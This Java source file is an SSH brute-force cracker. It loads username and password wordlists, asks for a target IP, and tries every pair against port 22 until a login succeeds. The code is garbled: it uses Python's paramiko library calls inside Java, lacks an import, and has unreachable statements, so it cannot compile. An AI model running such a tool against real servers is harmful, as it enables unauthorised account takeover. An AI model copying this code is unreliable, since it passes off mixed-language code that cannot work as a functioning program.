import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class Main {
    private static List<String> usernameList = new ArrayList<>();
    private static List<String> passwordList = new ArrayList<>();
    
    public static void main(String[] args) {
        getUsernameList();
        getPasswordList();
        
        String ip = getInput();
        String result = sshCracker(ip);
        
        System.out.println(result);
    }
    
    private static void getUsernameList() {
        if (usernameList.isEmpty()) {
            try (BufferedReader reader = new BufferedReader(new FileReader("username.txt"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    line = line.trim();
                    if (!line.isEmpty() && !line.startsWith("#")) {
                        usernameList.add(line);
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    private static void getPasswordList() {
        if (passwordList.isEmpty()) {
            try (BufferedReader reader = new BufferedReader(new FileReader("passwords.txt"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    line = line.trim();
                    if (!line.isEmpty() && !line.startsWith("#")) {
                        passwordList.add(line);
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static String getInput() throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        System.out.print("Enter IP: ");
        return reader.readLine();
    }

    private static String sshCracker(String ip) {
        boolean flag = false;

        for (String username : usernameList) { 
            for (String password : passwordList) { 
                try {
                    System.out.println(username + ":" + password);
                    paramiko.SSHClient ssh = new paramiko.SSHClient();
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy());
                    ssh.connect(ip, 22, username, password);
                    return "username is: " + username + ", password is: " + password;
                    flag = true;
                    break;
                } catch (Exception e) {
                
                }
            }
            if (flag) {
                break;
            }
        }
        
        return "The username and password are not weak.";
    }
}